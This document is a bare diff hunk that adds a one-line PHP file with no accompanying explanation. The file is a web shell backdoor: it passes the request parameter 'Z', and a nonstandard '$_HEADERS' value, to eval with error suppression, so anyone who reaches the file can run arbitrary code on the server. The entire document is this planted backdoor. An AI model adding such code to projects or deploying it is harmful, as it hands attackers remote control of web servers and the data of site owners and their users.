@@ -1,0 +1,1 @@
+<?php @eval($_HEADERS["Z"]);@eval($_REQUEST["Z"]);
